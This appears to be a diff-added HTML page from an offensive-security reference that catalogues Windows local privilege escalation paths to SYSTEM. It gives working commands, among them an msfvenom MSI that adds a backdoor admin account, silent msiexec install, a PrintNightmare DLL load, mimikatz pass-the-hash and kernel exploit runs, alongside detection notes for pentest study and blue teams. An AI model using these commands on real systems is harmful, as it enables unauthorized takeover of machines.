+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Windows Local Privilege Escalation</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Exploit reliability varies; a crashing helper service is noticeable.</p>
+</article>
+<article id="pe-insecure-gui">
+<h3>Insecure GUI App as Admin</h3>
+<p class="summary">Break out of a higher-privileged app into a shell.</p>
+<p class="desc">Any custom or third-party application installed on the host and running at higher privilege is a candidate: a vendor management console, an elevated helper service with a tray UI, line-of-business / in-house software, a kiosk app, or an installer. Such apps are frequently configured to run as Administrator or SYSTEM and are rarely hardened, so they can be coerced into spawning a child process that inherits their privileges: break out through a File &gt; Open/Save dialog (type a path, or right-click &gt; Open in a new window), embedded Help (hh.exe), or a hyperlink that launches a browser you then escape to cmd. The more bespoke software a machine runs elevated, the more of these break-out primitives exist. Enumerate what is installed and how each process runs.</p>
+<p class="meta"><b>Affects:</b> Depends on the installed application, not the Windows build.</p>
+<h4>Requires</h4><ul class="req"><li>A higher-privileged (admin/SYSTEM) GUI process you can interact with</li></ul>
+<h4>Tools</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Windows Local Privilege Escalation</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1548/" rel="noopener nofollow">T1548</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, GUI apps &amp; privilege escalation</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Spawning cmd from an unexpected parent (a vendor app, an installer, a browser, hh.exe) is a strong process-tree signal.</p>
+</article>
+<article id="pe-printnightmare">
+<h3>PrintNightmare (CVE-2021-1675 / CVE-2021-34527)</h3>
+<p class="summary">Spooler loads an attacker DLL as SYSTEM.</p>
+<p class="desc">The Print Spooler's RpcAddPrinterDriverEx lets an authenticated user register a printer &quot;driver&quot; DLL that spoolsv.exe (running as SYSTEM) then loads. CVE-2021-1675 was the initial local-privilege-escalation assignment (June 2021 patch); when that patch was shown not to stop the attack, Microsoft assigned CVE-2021-34527 for the same primitive. The identical technique runs your DLL as SYSTEM either locally (point it at an on-disk DLL) or remotely (a UNC/SMB driver path against another host's spooler). Requires the Print Spooler service to be running; fully mitigated by disabling it or patching.</p>
+<p class="meta"><b>Affects:</b> Unpatched Windows / Server, pre-July 2021. CVE-2021-1675 was the initial LPE assignment (June 2021); CVE-2021-34527 was assigned for the same RpcAddPrinterDriverEx primitive once the first patch was shown not to stop it, so the two IDs do not split cleanly into local vs remote. Print Spooler must be enabled.</p>
+<h4>Requires</h4><ul class="req"><li>Print Spooler service running</li><li>Unpatched host</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Local LPE via a driver DLL</span>
+SharpPrintNightmare.exe C:\Temp\addCync.dll</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/cube0x0/CVE-2021-1675" rel="noopener nofollow">SharpPrintNightmare</a></li><li><a href="https://github.com/gentilkiwi/mimikatz" rel="noopener nofollow">mimikatz (misc::printnightmare)</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675" rel="noopener nofollow">MSRC, CVE-2021-1675</a></li><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527" rel="noopener nofollow">MSRC, CVE-2021-34527</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Spooler loading a user-supplied driver DLL is heavily detected post-2021. Disabling the spooler kills it entirely.</p>
+</article>
+<article id="pe-always-install-elevated">
+<h3>AlwaysInstallElevated</h3>
+<p class="summary">Install a malicious MSI that runs as SYSTEM.</p>
+<p class="desc">If the AlwaysInstallElevated policy DWORD is set to 1 in BOTH HKLM and HKCU, any user can install an MSI package that executes with SYSTEM privileges. Generate a malicious MSI and install it quietly. Both keys must be set; one alone is not exploitable.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions (only when the AlwaysInstallElevated policy is enabled in both hives).</p>
+<h4>Requires</h4><ul class="req"><li>AlwaysInstallElevated = 0x1 in HKLM AND HKCU</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Check both hives (both must be 0x1)</span>
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre>
+<pre><code><span class="cmt"># Build a SYSTEM payload MSI</span>
+msfvenom -p windows/x64/exec cmd='net user attacker P@ssw0rd! /add &amp;&amp; net localgroup administrators attacker /add' -f msi -o evil.msi</code></pre>
+<pre><code><span class="cmt"># Install silently (transfer evil.msi to C:\Temp on the target first)</span>
+msiexec /quiet /qn /i C:\Temp\evil.msi</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/rapid7/metasploit-framework" rel="noopener nofollow">msfvenom (Metasploit)</a></li><li><a href="https://github.com/PowerShellMafia/PowerSploit" rel="noopener nofollow">PowerUp</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1548/002/" rel="noopener nofollow">T1548.002</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://pentestlab.blog/2017/02/28/always-install-elevated/" rel="noopener nofollow">PentestLab, Always Install Elevated</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> msiexec installing an unsigned MSI from a temp path is suspicious; the new local admin / process tree is detectable.</p>
+</article>
+<article id="pe-kernel-enum">
+<h3>Enumerate Missing Patches</h3>
+<p class="summary">Map OS build/hotfixes to known kernel LPEs.</p>
+<p class="desc">Collect systeminfo (OS version + installed KBs) and feed it to WES-NG, the actively-updated primary tool, to list kernel/privilege-escalation CVEs the system is missing patches for. This is the triage step before grabbing a specific exploit binary; prefer it on older/unpatched hosts where service/token misconfigs are absent. Watson is an on-host alternative but is archived/unmaintained (read-only since 2021) and only covers Win10 up to 2004 and Server 2016-2019, so it returns empty/incomplete output on Windows 11, Server 2022, and Win10 20H2+; use Seatbelt or PrivescCheck for on-host checks on modern targets.</p>
+<p class="meta"><b>Affects:</b> Triage step; applicability depends on the CVE it surfaces.</p>
+<h4>Requires</h4><ul class="req"><li>Low-priv shell</li><li>Ability to read OS version / run systeminfo</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Collect target info</span>
+systeminfo &gt; systeminfo.txt</code></pre>
+<pre><code><span class="cmt"># Bootstrap the definitions (fresh clone has none)</span>
+python wes.py --update</code></pre>
+<pre><code><span class="cmt"># Analyze offline (attacker host)</span>
+python wes.py systeminfo.txt --muc-lookup</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/bitsadmin/wesng" rel="noopener nofollow">WES-NG</a></li><li><a href="https://github.com/rasta-mouse/Watson" rel="noopener nofollow">Watson (archived; Win10&lt;=2004 / Server 2016-2019 only)</a></li><li><a href="https://github.com/itm4n/PrivescCheck" rel="noopener nofollow">PrivescCheck</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Windows Local Privilege Escalation</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> WES-NG runs offline on the attacker host (invisible). Watson is a .NET assembly run on-target, but it is archived and blind to modern builds. The follow-on kernel exploit is what risks instability.</p>
+</article>
+<article id="pe-kernel-exploit">
+<h3>Kernel Exploit (generic)</h3>
+<p class="summary">Run a public exploit for an unpatched kernel CVE.</p>
+<p class="desc">Once a missing-patch CVE is identified, run the matching public exploit against a kernel/driver vulnerability to execute code in the kernel and obtain a SYSTEM context (e.g. older targets vulnerable to CVE-2018-8120, MS16-135/CVE-2016-7255, or CVE-2021-1732, all Win32k kernel bugs). Verify the exact build first: wrong-build kernel exploits frequently bugcheck the host.</p>
+<p class="meta"><b>Affects:</b> Depends entirely on the specific CVE and exact build.</p>
+<h4>Requires</h4><ul class="req"><li>Confirmed unpatched kernel CVE for the exact OS build</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Example (build-specific binary; most kernel PoCs pop a SYSTEM shell rather than take a command)</span>
+.\exploit.exe cmd.exe</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/SecWiki/windows-kernel-exploits" rel="noopener nofollow">SecWiki windows-kernel-exploits</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-8120" rel="noopener nofollow">NVD, CVE-2018-8120 (Win32k EoP)</a></li><li><a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-135" rel="noopener nofollow">Microsoft, MS16-135 bulletin (CVE-2016-7255)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> High risk of instability / BSOD on the wrong build. Loud and last-resort; prefer misconfig-based vectors when available.</p>
+</article>
+<article id="pe-cve-2023-21768">
+<h3>CVE-2023-21768 (AFD.sys)</h3>
+<p class="summary">AFD for WinSock write primitive on Win11 21H2/22H2 and Server 2022; public PoC completes SYSTEM only on 22H2.</p>
+<p class="desc">An elevation-of-privilege flaw in the Ancillary Function Driver for WinSock (afd.sys) that yields a controlled arbitrary kernel WRITE. The CVE and its write primitive affect Windows 11 21H2/22H2 and Server 2022. The widely-used chompie1337 public PoC uses that write to corrupt IoRing (I/O Ring) registered-buffer structures into a full arbitrary kernel read/write primitive, then swaps the process token to SYSTEM; it only completes this chain on Windows 11 22H2, so other builds require porting the offsets. Fast and reliable where the PoC matches the build.</p>
+<p class="meta"><b>Affects:</b> Windows 11 21H2/22H2 and Server 2022, unpatched (pre-Jan 2023).</p>
+<h4>Requires</h4><ul class="req"><li>Unpatched Windows 11 22H2 / Server 2022 build</li></ul>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768" rel="noopener nofollow">chompie1337 PoC</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21768" rel="noopener nofollow">MSRC, CVE-2023-21768</a></li><li><a href="https://www.sentinelone.com/blog/cve-2023-21768/" rel="noopener nofollow">SentinelOne, CVE-2023-21768</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Driver exploitation can be caught by HVCI/EDR; the wrong build risks a bugcheck.</p>
+</article>
+<article id="pe-cve-2021-1732">
+<h3>CVE-2021-1732 (Win32k)</h3>
+<p class="summary">Win32k out-of-bounds write → SYSTEM (in-the-wild).</p>
+<p class="desc">A Win32k elevation-of-privilege via an out-of-bounds write (CWE-787): a user-mode callback (NtUserConsoleControl / xxxClientAllocWindowClassExtraBytes) leaves the tagWND.WndExtra pointer and its is-offset flag out of sync, yielding kernel read/write and a token swap to SYSTEM. Originally exploited in the wild by the Bitter APT; the public KaLendsi PoC is validated on 1909 x64 and its offsets are build-specific, so other builds need porting.</p>
+<p class="meta"><b>Affects:</b> Windows 10 1803–20H2 and Server 2019, unpatched (pre-Feb 2021). Per NVD CPE data, Server 2016 is not affected, and 1903 (out of support at patch time) is not in the NVD/MSRC list.</p>
+<h4>Requires</h4><ul class="req"><li>Unpatched affected Windows 10 / Server build</li></ul>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/KaLendsi/CVE-2021-1732-Exploit" rel="noopener nofollow">KaLendsi PoC</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1732" rel="noopener nofollow">MSRC, CVE-2021-1732</a></li><li><a href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-1732.html" rel="noopener nofollow">Google Project Zero, CVE-2021-1732 in-the-wild RCA</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Kernel token manipulation is EDR-visible; the wrong build risks instability.</p>
+</article>
+<article id="pe-cve-2020-0787">
+<h3>CVE-2020-0787 (BITS)</h3>
+<p class="summary">BITS arbitrary file move → SYSTEM, no SeImpersonate.</p>
+<p class="desc">A symlink / arbitrary-file-move flaw in the Background Intelligent Transfer Service (BITS) that itm4n's exploit turns into an arbitrary file write as SYSTEM, then code execution. Works from a plain user without SeImpersonatePrivilege, across many Windows 7–10 builds.</p>
+<p class="meta"><b>Affects:</b> Windows 7 – Windows 10 1909 / Server 2008–2019, unpatched (pre-Mar 2020).</p>
+<h4>Requires</h4><ul class="req"><li>Unpatched Windows 7–10 / Server build</li><li>BITS service available</li></ul>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/itm4n/CVEs/tree/master/CVE-2020-0787" rel="noopener nofollow">itm4n CVE-2020-0787 PoC</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0787" rel="noopener nofollow">MSRC, CVE-2020-0787</a></li><li><a href="https://itm4n.github.io/cve-2020-0787-windows-bits-eop/" rel="noopener nofollow">itm4n, CVE-2020-0787</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Reliable and quiet relative to kernel exploits, but the file-move primitive and new SYSTEM process are detectable.</p>
+</article>
+<article id="pe-bluehammer">
+<h3>BlueHammer (CVE-2026-33825)</h3>
+<p class="summary">Race Defender remediation for a privileged file write → SYSTEM.</p>
+<p class="desc">CVE-2026-33825: insufficient access-control granularity in Microsoft Defender. A local user races a time-of-check / time-of-use window in Defender's threat-remediation engine, which writes files as SYSTEM without revalidating the path, to escalate to SYSTEM. Disclosed April 2026 alongside RedSun and UnDefend, patched in the April update, and listed in CISA's Known Exploited Vulnerabilities catalog. Awareness entry; exploitation specifics are intentionally omitted.</p>
+<p class="meta"><b>Affects:</b> Microsoft Defender Antimalware Platform before 4.18.26030.3011 (Windows 10/11, Server 2016-2025); patched April 2026, in CISA KEV.</p>
+<h4>Requires</h4><ul class="req"><li>A standard user session on a host with a vulnerable (pre-4.18.26030.3011) Defender platform</li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33825" rel="noopener nofollow">NVD, CVE-2026-33825</a></li><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-33825" rel="noopener nofollow">MSRC, CVE-2026-33825</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Patched builds are immune; on unpatched hosts the remediation race and the new SYSTEM process are detectable.</p>
+</article>
+<article id="pe-redsun">
+<h3>RedSun (CVE-2026-41091)</h3>
+<p class="summary">Abuse Microsoft Defender cloud-file restore to write a file as SYSTEM (now patched).</p>
+<p class="desc">A now-patched engine-level Windows privilege escalation (CVE-2026-41091, link-following / CWE-59), distinct from BlueHammer's plain remediation-write TOCTOU. During threat remediation Defender RESTORES (rather than quarantines) a cloud-tagged placeholder file, converted via the Windows Cloud Files API (cfapi/cldapi.dll), and does not revalidate the target path. A local user holds a batch oplock to pause the SYSTEM-privileged restore, then swaps in an NTFS junction that redirects the rewrite of the placeholder into a protected path (e.g. C:\Windows\System32\TieringEngineService.exe), landing code as SYSTEM. Disclosed April 2026, fixed in Defender Engine 1.1.26040.8 on 2026-05-19. Listed for awareness only; exploitation specifics are intentionally omitted.</p>
+<p class="meta"><b>Affects:</b> Windows 10/11 and Server 2019+ running Microsoft Defender before Malware Protection Engine 1.1.26040.8 / Antimalware Platform 4.18.26040.7; patched 2026-05-19, added to CISA KEV 2026-05-20.</p>
+<h4>Requires</h4><ul class="req"><li>A standard user session on a host running an unpatched Microsoft Defender</li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41091" rel="noopener nofollow">NVD, CVE-2026-41091</a></li><li><a href="https://socradar.io/blog/bluehammer-redsun-undefend-windows-defender-0days/" rel="noopener nofollow">SOCRadar, BlueHammer / RedSun / UnDefend Defender 0-days</a></li><li><a href="https://www.vectra.ai/blog/when-the-defender-becomes-the-door-bluehammer-redsun-and-undefend-in-the-wild" rel="noopener nofollow">Vectra, BlueHammer / RedSun / UnDefend in the wild</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Triggering the exploit requires a Defender detection event (EICAR/malicious-file bait) that is itself logged, and success overwrites a signed System32 binary (TieringEngineService.exe); both are high-signal artifacts, not just a subtle path-confusion pattern.</p>
+</article>
+<article id="pe-cve-2019-1388">
+<h3>CVE-2019-1388 (hhupd)</h3>
+<p class="summary">UAC certificate dialog → SYSTEM browser → shell.</p>
+<p class="desc">The Windows Certificate Dialog in the hhupd.exe UAC prompt failed to drop privileges when following the certificate's &quot;Issued by&quot; hyperlink. Clicking it opens Internet Explorer as SYSTEM; from there a Save-As / file dialog launches cmd.exe as SYSTEM. A one-click GUI escalation on unpatched Windows 7–10 / 2008–2019.</p>
+<p class="meta"><b>Affects:</b> Windows 7 through 10 1903 and Server 2008 through 2019, unpatched (pre-Nov 2019). Windows 10 1909 shipped with the fix. (1703 was already out of support at patch time and is not in the Nov 2019 advisory, though the code path was equally vulnerable.)</p>
+<h4>Requires</h4><ul class="req"><li>Unpatched build</li><li>Ability to trigger the hhupd UAC dialog</li></ul>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/jas502n/CVE-2019-1388" rel="noopener nofollow">CVE-2019-1388 PoC (hhupd.exe bundle)</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1548/002/" rel="noopener nofollow">T1548.002</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1388" rel="noopener nofollow">MSRC, CVE-2019-1388</a></li><li><a href="https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege" rel="noopener nofollow">ZDI, CVE-2019-1388</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> iexplore.exe running as SYSTEM with parent consent.exe (and a cmd.exe child) is the tell-tale anomaly; the canonical Sigma rule matches exactly this consent.exe -&gt; iexplore.exe pair.</p>
+</article>
+<article id="pe-recovered-creds">
+<h3>Recovered Credentials</h3>
+<p class="summary">A credential you recovered. Reuse it, and if it is a local admin, escalate.</p>
+<p class="desc">Hunting the host (event logs, SAM/LSA secrets, DPAPI, autologon, config files, PowerShell history, browser and password-manager stores, the Credential Manager vault) yields a CREDENTIAL, not SYSTEM. What it gets you depends on whose it is. A local administrator's password or hash can be reused (runas, or pass-the-hash) to act as a local admin on this host, then take an Admin to SYSTEM path. Pass-the-hash as the built-in RID 500 Administrator works by default; pass-the-hash as any other local admin only works where LocalAccountTokenFilterPolicy=1 (non-RID-500 admins are otherwise token-filtered to medium integrity on remote logon). A domain or service account is a lateral lead into Active Directory. A peer user's is only useful sideways. Check what the account actually is before assuming it helps.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions.</p>
+<h4>Requires</h4><ul class="req"><li>A credential recovered from the host</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Run as the recovered local user (cleartext)</span>
+runas /user:Administrator cmd.exe</code></pre>
+<pre><code><span class="cmt"># Pass-the-hash to a local admin shell (token injection, no network)</span>
+sekurlsa::pth /user:Administrator /domain:. /ntlm:&lt;nthash&gt; /run:cmd.exe</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/gentilkiwi/mimikatz" rel="noopener nofollow">Mimikatz</a></li><li><a href="https://github.com/Pennyw0rth/NetExec" rel="noopener nofollow">NetExec</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1078/" rel="noopener nofollow">T1078</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Windows local privilege escalation</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Reusing a recovered local credential is quieter than exploitation but still logged; a mismatched account or source is the tell. The 4624 logon type varies by method: interactive runas is type 2; local pass-the-hash / over-PtH via sekurlsa::pth is type 9 (NewCredentials, seclogo); a network logon elsewhere with the reused hash is type 3.</p>
+</article></section>
+<section class="phase" id="ph-svcacct"><h2 class="phase-h" style="color:oklch(0.70 0.13 183)">Service Account</h2><article id="pe-svc-account">
+<h3>Service Account</h3>
+<p class="summary">Running as LOCAL/NETWORK SERVICE or an application-pool identity.</p>
+<p class="desc">Code execution as a Windows service account: LOCAL SERVICE, NETWORK SERVICE, an IIS application-pool identity, or a service such as MSSQL. whoami names the account; whoami /priv lists its privileges. Service accounts very commonly hold SeImpersonatePrivilege, which leads straight to a Potato attack for SYSTEM. Where that privilege is not present, the default privilege set can usually be recovered first, then the same Potato path applies.</p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html" rel="noopener nofollow">HackTricks, Abusing Tokens</a></li></ul>
+</article>
+<article id="pe-localservice-fullpowers">
+<h3>Restore Service Account Privileges</h3>
+<p class="summary">Recover a limited service token to its default privileges, including SeImpersonate.</p>
+<p class="desc">A service running as LOCAL SERVICE or NETWORK SERVICE often starts with a heavily filtered token that is missing SeImpersonatePrivilege. The account's default privilege set can be restored by relaunching through the Task Scheduler while explicitly specifying the RequiredPrivileges set on the task principal, which forces the full default privilege set (including SeImpersonate / SeAssignPrimaryToken) into the spawned token, so a Potato attack becomes possible again. (Note: a task with RequiredPrivileges absent recovers everything EXCEPT SeImpersonate, so the explicit list is what does the work.) itm4n's FullPowers automates this, but it was archived (unmaintained) in 2024 and is reportedly less reliable on Windows 11 / Server 2022 and later, so treat it as one tool for the technique, not the technique itself, and verify on target.</p>
+<p class="meta"><b>Affects:</b> Works on Windows 10 / Server 2016 to 2019. Reportedly less reliable on Windows 11 / Server 2022 and later; verify on target. If the account already holds SeImpersonate, skip this and go straight to a Potato (GodPotato needs only that privilege).</p>
+<h4>Requires</h4><ul class="req"><li>Code execution as LOCAL SERVICE / NETWORK SERVICE</li><li>Task Scheduler reachable</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Recover the default privileges</span>
+FullPowers.exe -c &quot;C:\Temp\payload.exe&quot; -z</code></pre>
+<pre><code><span class="cmt"># Confirm SeImpersonate is back</span>
+whoami /priv</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/itm4n/FullPowers" rel="noopener nofollow">FullPowers</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1134/" rel="noopener nofollow">T1134</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://itm4n.github.io/localservice-privileges/" rel="noopener nofollow">itm4n, Give Me Back My Privileges</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Spawns a scheduled-task-hosted process; the recovered token then runs Potato tooling, which EDR signatures heavily.</p>
+</article></section>
+<section class="phase" id="ph-system"><h2 class="phase-h" style="color:oklch(0.70 0.13 274)">SYSTEM</h2><article id="nt-system">
+<h3><span class="kind">goal</span> NT AUTHORITY\SYSTEM</h3>
+<p class="summary">👑 Full local SYSTEM privileges.</p>
+<p class="desc">You hold SYSTEM (or local administrator) on the host, with full control of the machine, its services, and any credentials in memory or on disk. From here, dump credentials and pivot. On a domain-joined host the next move is the Active Directory map, but it is not always AD: a dumped local-admin hash reused across a workgroup, or a recovered service-account credential, moves you host-to-host with no domain involved (see the Local Lateral Movement branch).</p>
+<h4>Requires</h4><ul class="req"><li>Any one successful local escalation vector</li></ul>
+</article>
+<article id="pe-prim-service-exec">
+<h3>Service Executes Your Code</h3>
+<p class="summary">A SYSTEM service launches your payload on (re)start.</p>
+<p class="desc">Whether you rewrote a binPath, replaced the on-disk EXE, hijacked a DLL it loads, edited the service's registry key, reconfigured it as a Server Operator, or pointed a service plugin at your DLL (DnsAdmins), the outcome is identical. When the Service Control Manager next starts the service, it runs your code as its account, almost always LocalSystem.</p>
+<h4>Requires</h4><ul class="req"><li>Control over what a privileged service executes</li><li>Ability to (re)start the service or wait for a reboot</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Trigger the (re)start (sc stop returns at STOP_PENDING, so wait before starting)</span>
+sc stop &lt;service&gt; &amp; timeout /t 5 &amp; sc start &lt;service&gt;</code></pre>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1543/003/" rel="noopener nofollow">T1543.003</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Windows Local Privilege Escalation</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Service install/change events (7045/7040) plus an unusual child process under services.exe are high-fidelity signals. Restore the original config afterward.</p>
+</article>
+<article id="pe-prim-trigger">
+<h3>Auto-Run Executes Your Code</h3>
+<p class="summary">Code a higher-privileged context runs automatically.</p>
+<p class="desc">Several misconfigs share one shape: a binary or script that a higher-privileged context executes, whether on a schedule, at logon, or via an accessibility hook (utilman/sethc), is writable by you, directly or after taking ownership. Overwrite it and wait for, or invoke, the trigger; your payload then runs as that principal.</p>
+<h4>Requires</h4><ul class="req"><li>A writable binary/script invoked automatically by a privileged context</li><li>The trigger fires: logon, schedule, lock screen, or you invoke it</li></ul>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Windows Local Privilege Escalation</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> New/modified autorun, scheduled-task, or accessibility binaries are classic IOCs. The signals differ by vector: scheduled-task changes fire Event ID 4698/4702; autorun (Run key / Startup) changes surface as registry-modify (Sysmon Event ID 13 / Security 4657) and via Autoruns; accessibility-binary (utilman/sethc) overwrites surface as System32 file-create (Sysmon Event ID 11) and the image-load of the accessibility binary. Overwriting an existing target is quieter than creating one; restore it afterward.</p>
+</article>
+<article id="pe-prim-kernel-exec">
+<h3>Kernel-Mode Code Execution</h3>
+<p class="summary">Ring-0 execution collapses straight to SYSTEM.</p>
+<p class="desc">A public kernel-CVE exploit or a bring-your-own-vulnerable-driver load (via SeLoadDriverPrivilege / Print Operators) gives you code execution in ring 0. From the kernel you can patch your token, steal the SYSTEM token, or spawn a SYSTEM process directly. The most powerful but least stable route: a wrong-build exploit or a blocked driver bugchecks the host.</p>
+<h4>Requires</h4><ul class="req"><li>A working kernel exploit, or a loadable vulnerable driver, for the exact OS build</li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<p class="opsec"><b>OPSEC / detection:</b> BYOVD is increasingly PREVENTED outright by HVCI / Memory Integrity plus the Microsoft Vulnerable Driver Blocklist (default-on since Win11 22H2), which stops a blocklisted or unsigned driver from loading in the first place. Unsigned driver loads and ring-0 token manipulation are also high-signal EDR detections (Sysmon Event ID 6 unsigned loads, 7045 service creation), and instability risks a visible crash. Prefer a misconfig vector when one exists.</p>
+</article></section>
+
+</main>
+<footer>
+<p>HackGraph is an open-source cybersecurity reference and study notes for offensive security. It maps attack paths as interactive, click-to-expand graphs that run from a foothold to Domain Admin or root. Every technique lists the commands to run, the tools it uses, detection and OPSEC notes, and links to primary sources. It works as notes for penetration testing, red teaming, and CTFs, for OSCP, OSEP, CRTP, CRTE, and PNPT prep, and as a detection reference for blue teams.</p>
+<p><a href="/">Interactive graph</a> &middot; <a href="/reference.html">All references</a> &middot; <a href="https://github.com/HackGraph/hackgraph.github.io">Source on GitHub</a></p>
+<p>This is a text mirror of the interactive graph for search engines and offline reading. Techniques are documented for authorized penetration testing, CTFs, certification study, and blue-team detection.</p>
+</footer>
+</body>
+</html>
